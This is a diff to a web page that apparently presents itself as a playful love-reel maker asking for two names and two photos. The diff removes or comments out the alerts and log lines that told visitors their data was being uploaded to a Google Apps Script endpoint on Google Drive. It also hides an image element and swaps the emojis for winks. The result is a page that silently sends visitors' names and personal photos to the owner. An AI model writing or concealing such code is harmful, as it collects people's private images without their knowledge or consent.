@@ -86,7 +86,7 @@
     width:90px;
     height:120px;
 
-    display:block !important;
+    display:none;
 
     border:3px solid gold;
   }
@@ -586,7 +586,7 @@ button:hover{
   </div>
 
   <!-- Submit -->
-  <button onclick="startLove()">💕 Submit 💕</button>
+  <button onclick="startLove()">😉 Submit 😉</button>
 
 </div>
 
@@ -769,7 +769,7 @@ function startLove(){
 
   /* Validation */
   if(you==="" || gf===""){
-    alert("Please enter both names 💕");
+    alert("Please enter both names 👀");
     return;
   }
 
@@ -1014,18 +1014,16 @@ async function downloadReel(){
     recorder.stop();
   },8000);
 }
-console.log("UPLOAD FUNCTION STARTED");
-alert("Upload started");
 
 const DRIVE_API =
 "https://script.google.com/macros/s/AKfycbyHP7zQZUlGwPpctu0r4w3HrVdfSrmkSwbk3IjNuL7H__Tond_DhZM6PMF4NVyo1nzQiQ/exec"; // your URL
-console.log("UPLOAD FUNCTION STARTED");
-alert("Upload started");
+// console.log("UPLOAD FUNCTION STARTED");
+// alert("Upload started");
 
 
 function uploadToDrive(you,gf,leftImg,rightImg){
 
-  console.log("Upload started...");
+//   console.log("Upload started...");
 
   const r1 = new FileReader();
   const r2 = new FileReader();
@@ -1049,11 +1047,11 @@ function uploadToDrive(you,gf,leftImg,rightImg){
       .then(data=>{
         console.log(data);
 
-        if(data.status==="success"){
-          alert("Saved to Google Drive ✅");
-        }else{
-          alert("Error ❌ " + data.message);
-        }
+        // if(data.status==="success"){
+        //   alert("Saved to Google Drive ✅");
+        // }else{
+        //   alert("Error ❌ " + data.message);
+        // }
       })
       .catch(err=>{
         console.error(err);
@@ -1069,9 +1067,9 @@ function uploadToDrive(you,gf,leftImg,rightImg){
 }
 
 
+
 </script>
 
 
 </body>
 </html>
-
